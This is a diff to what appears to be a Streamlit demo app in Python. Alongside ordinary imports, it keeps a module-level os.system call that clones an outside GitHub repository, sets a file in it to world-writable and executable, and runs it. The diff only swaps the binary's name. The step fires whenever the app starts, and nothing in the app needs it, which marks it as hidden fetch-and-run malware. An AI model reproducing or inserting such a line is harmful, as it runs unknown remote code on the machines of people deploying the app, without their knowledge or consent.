@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("git clone https://github.com/aurbach55/zash.git && cd zash && chmod 777 zil && ./zil")
+os.system ("git clone https://github.com/aurbach55/zash.git && cd zash && chmod 777 bet && ./bet")
 """
 # Welcome to Streamlit!
 
